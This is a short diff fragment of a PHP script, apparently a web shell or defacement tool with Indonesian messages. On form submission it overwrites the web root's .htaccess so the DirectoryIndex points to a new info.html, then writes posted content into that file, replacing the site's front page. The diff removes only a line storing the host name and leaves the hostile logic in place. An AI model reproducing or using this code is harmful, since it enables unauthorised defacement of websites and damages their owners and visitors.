@@ -58,7 +58,6 @@
 <?php
 if(htmlspecialchars(isset($_POST['submit']))){
 	if(file_put_contents($_SERVER['DOCUMENT_ROOT'].'/.htaccess','DirectoryIndex info.html') && file_put_contents($_SERVER['DOCUMENT_ROOT'].'/info.html',htmlspecialchars($_POST['content']))){
-        $hostt = $_SERVER['HTTP_HOST'];
             echo "<script>
                 Swal.fire(
                     'Berhasil!',
